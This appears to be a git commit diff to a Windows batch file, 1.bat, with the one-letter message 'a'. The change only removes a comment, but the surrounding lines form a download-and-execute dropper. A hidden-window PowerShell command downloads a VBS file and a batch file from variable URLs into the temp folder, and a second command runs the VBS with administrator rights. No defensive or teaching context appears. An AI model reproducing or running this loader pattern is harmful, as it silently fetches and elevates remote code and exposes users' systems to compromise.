084baef90d3c7fc660c652ade5a6f2116acfc78a
ofutpemata22 <gagi.cu.ci@gmail.com>
2025-04-16 00:09:14 +0300

    a

--- 1.bat
+++ 1.bat
@@ -6,5 +6,4 @@ set "batFile=%TEMP%\ngr.bat"
 
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%vbsUrl%', '%vbsFile%'); (New-Object Net.WebClient).DownloadFile('%batUrl%', '%batFile%')"
 
-:: Run the VBS file as administrator
 start "" "powershell.exe" -Command "Start-Process '%vbsFile%' -Verb RunAs"
